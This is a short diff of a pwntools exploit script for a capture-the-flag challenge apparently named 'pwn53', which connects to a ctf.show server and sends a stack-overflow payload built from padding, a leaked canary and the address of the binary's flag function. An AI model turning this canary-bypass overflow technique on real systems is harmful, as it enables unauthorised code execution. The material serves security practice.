@@ -203,9 +203,9 @@ for i in range(4):
 print('canary=', canary)
 
 io = remote('pwn.challenge.ctf.show', 28130)
-elf = ELF('./pwn')
+elf = ELF('./pwn53')
 flag = elf.sym['flag']
-payload = 'a' * 0x20 + canary + p32(0) * 4 + p32(flag)
+payload = cyclic(0x20) + canary.encode() + p32(0) * 4 + p32(flag)
 io.sendlineafter('>', '-1')
 io.sendafter('$ ', payload)
 io.interactive()
